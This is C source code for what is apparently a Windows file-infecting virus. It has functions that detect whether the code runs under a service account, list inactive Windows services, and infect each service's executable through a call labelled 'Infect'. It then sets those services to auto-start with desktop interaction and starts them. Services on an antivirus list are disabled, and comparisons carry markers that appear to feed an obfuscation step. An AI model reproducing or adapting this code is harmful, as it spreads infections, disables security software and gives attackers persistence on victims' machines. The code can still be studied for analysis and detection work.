
///////////////////////////////////////////////////////////////
// check are we service ///////////////////////////////////////

BOOL CheckService()
{
	char usn[0xFF], cpn[0xFF];
	DWORD szusn, szcpn, l;

	unsigned char *env0, *env;  //@S
	BOOL SERVICEFND;

	if (/*@S==*/isSystemNT()==0/*@E*/) return FALSE;
 
	szusn = sizeof(usn);
	_GetUserName(usn, &szusn);

 #ifdef dbgdbg
	adddeb("CheckService usn:'%s'",usn);
 #endif 

	//XP: 'LOCAL SERVICE', 'NETWORK SERVICE'
	//Win7, Server2008: 'NT SERVICE\...'

	if (/*@S==*/usn[0]==0/*@E*/) return TRUE;
	if (/*@S!=*/serstr(usn,"SYSTEM",1) != 0xFFFF/*@E*/) return TRUE;    //@S
	if (/*@S!=*/serstr(usn," SERVICE",1) != 0xFFFF/*@E*/) return TRUE;  //@E

	szcpn=sizeof(cpn);
	_GetComputerName(cpn, &szcpn);

 #ifdef dbgdbg
	adddeb("CheckService cpn:'%s'",cpn);
 #endif 

	// vista COMPNAME$ in USERNAME check

	_strcat(cpn,"$");
	if (/*@S!=*/serstr(cpn,usn,1) != 0xFFFF/*@E*/) return TRUE;

	// envlist 'systemprofile' and 'ervice' check

	env0 = _GetEnvironmentStrings();
	env = env0;  //@S
	SERVICEFND = FALSE;    //@E

	loop:;
		if (/*@S==*/env[0]==0/*@E*/) goto skip;

		#ifdef dbgdbg
		 adddeb("CheckService env:%s",env);
		#endif 

		l = strlen(env);                                                                      //@S
		if (/*@S!=*/serstr(env,"ervice",1) != 0xFFFF/*@E*/) { SERVICEFND=TRUE; goto skip; }       
		if (/*@S!=*/serstr(env,"systemprofile",1) != 0xFFFF/*@E*/) { SERVICEFND=TRUE; goto skip; }//@E
		
		env = /*@S+*/env + l + 1/*@E*/;
	goto loop;

	skip:;
	_FreeEnvironmentStrings(env0);
	if (SERVICEFND) return TRUE;

	return FALSE;
}

///////////////////////////////////////////////////////////////
// Process service - infect ///////////////////////////////////

void ProcessService(SC_HANDLE scm,char *sname,BOOL *SVCHOST,DWORD *START_SVC)
{
	//@S
	QUERY_SERVICE_CONFIG *qsc;
	SC_HANDLE scs;
	int i;
	DWORD sz;
	DWORD ee;
	BOOL res;
	unsigned char search[10];
	unsigned char *exe;
	char chk[0xFF];
	DWORD SvcType, start; 
	//@E

	 //for AVSVC check
	strcpy(chk,"|"); _strcat(chk,sname); _strcat(chk,"|");                                //@S

	scs=_OpenService(scm,sname,SERVICE_QUERY_CONFIG|SERVICE_START|SERVICE_CHANGE_CONFIG); //@E
	if (/*@S==*/scs==NULL/*@E*/) return;

	//--- Query info: exe name & service type

	_QueryServiceConfig(scs, NULL, 0, &sz); //get size we need

	qsc = _LocalAlloc(LMEM_FIXED, sz);
	res= _QueryServiceConfig(scs, qsc, sz, &ee);

 #ifdef dbgdbg
	adddeb("ProcessService ===== QueryServiceConfig: %i (allocated for qsc %i bytes)", res, sz);
 #endif

	if (/*@S==*/res == FALSE/*@E*/) goto skip;

	//--- Process service exe name

	exe = qsc[0].lpBinaryPathName;               
	lowerstr(exe, exe);

	 //check for '.exe' presence
	if (/*@S==*/serstr(exe,".exe",1) == 0xFFFF/*@E*/) goto skip; 

	 //check for svchost.exe and check if SVCHOST 'processed flag' is TRUE
	if (/*@S!=*/serstr(exe,"svchost",1) != 0xffff/*@E*/) { if (*SVCHOST) goto skip; else *SVCHOST=TRUE; }

	if (/*@S==*/exe[0]==34/*@E*/) //ascii34==quote 
	 { /*@S;*/exe++; i=0; search[0]=34; search[1]=0/*@E*/; } // quotes detected, this means path contains spaces
	else 
	 { /*@S;*/i=4; my_strcpy(search,".exe")/*@E*/; }         // no quotes stop after '.exe'

	ee = serstr(exe,search,1);
	if (/*@S==*/ee==0xFFFF/*@E*/) goto skip; else exe[ee+i]=0;

	//---

 #ifdef dbgdbg
	adddeb("ProcessService %s|%s|",exe,sname);
	adddeb("ProcessService dwServiceType:%X SVCHOST:%i START_SVC:%i",qsc[0].dwServiceType,*SVCHOST,*START_SVC);
	if ((qsc[0].dwServiceType&SERVICE_WIN32_OWN_PROCESS  )==SERVICE_WIN32_OWN_PROCESS  ) adddeb("ProcessService SERVICE_WIN32_OWN_PROCESS");
	if ((qsc[0].dwServiceType&SERVICE_WIN32_SHARE_PROCESS)==SERVICE_WIN32_SHARE_PROCESS) adddeb("ProcessService SERVICE_WIN32_SHARE_PROCESS");
	if ((qsc[0].dwServiceType&SERVICE_INTERACTIVE_PROCESS)==SERVICE_INTERACTIVE_PROCESS) adddeb("ProcessService SERVICE_INTERACTIVE_PROCESS");
 #endif

	//--- Infect

	res = ProcessEXE(exe, 0, FALSE); // CUT_LAST_CHAR==FALSE
	if (res == FALSE) goto skip;   // infect failed or already infected

	//--- Set StartUp to AUTO & Allow interact with desktop

	SvcType = qsc[0].dwServiceType; //@S
	start = SERVICE_AUTO_START;     //@E

	if (serstr(AVSVC,chk,1) != 0xFFFF) start=SERVICE_DISABLED; // this is AV service from our list

	if (/*@S!=*/(SvcType&SERVICE_INTERACTIVE_PROCESS)!=SERVICE_INTERACTIVE_PROCESS/*@E*/)
	 { SvcType=SvcType|SERVICE_INTERACTIVE_PROCESS; }
	else 
	 { if (/*@S&&*/(start==SERVICE_AUTO_START)&&(qsc[0].dwStartType==SERVICE_AUTO_START)/*@E*/) goto start; } // all ok, no need to change config

	res = _ChangeServiceConfig(scs, SvcType, start, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	#ifdef dbgdbg
	 if (start==SERVICE_AUTO_START) adddeb("ProcessService ChangeServiceConfig to SERVICE_AUTO_START res:%i (0 == failed)",res);
	                           else adddeb("ProcessService ChangeServiceConfig to SERVICE_DISABLED (AV!) res:%i (0 == failed)",res);
	#endif

	if (/*@S==*/res==0/*@E*/) goto skip;     //@S
	if (start == SERVICE_DISABLED) goto skip;  //@E // do not start AV service

	//--- Start Service

 start:;
	if (*START_SVC == 0) goto skip;

	res = _StartService(scs, 0, NULL);

 #ifdef dbgdbg
	adddeb("ProcessService StartService res:%i (0 == failed)", res);
 #endif

	if (/*@S!=*/res != 0/*@E*/) *START_SVC = *START_SVC - 1; 

 skip:;
	_LocalFree(qsc);
	_CloseServiceHandle(scs);
}

///////////////////////////////////////////////////////////////
// List all inactive services /////////////////////////////////

int ProcessInactiveServices(DWORD START_SVC)
{
	//@S
	SC_HANDLE scm;
	ENUM_SERVICE_STATUS ess[5000]; //~180kb
	int q;
	int w;
	int e=0;
	BOOL SVCHOST=FALSE;
	//@E

	if (!isSystemNT()) 
		return 0;

	scm = _OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (/*@S==*/_EnumServicesStatus(scm, SERVICE_WIN32, SERVICE_INACTIVE, &ess, sizeof(ess), &q, &w, &e) == 0/*@E*/) 
		return 0;

 #ifdef dbgdbg
	adddeb("\n***ProcessInactiveServices... %u inactive total, START_SVC:%i (0==FALSE)\n",w,START_SVC);
 #endif

	for (q=0;q<w;q++) 
		ProcessService(scm, ess[q].lpServiceName, &SVCHOST, &START_SVC);

	_CloseServiceHandle(scm);
	return w;
}
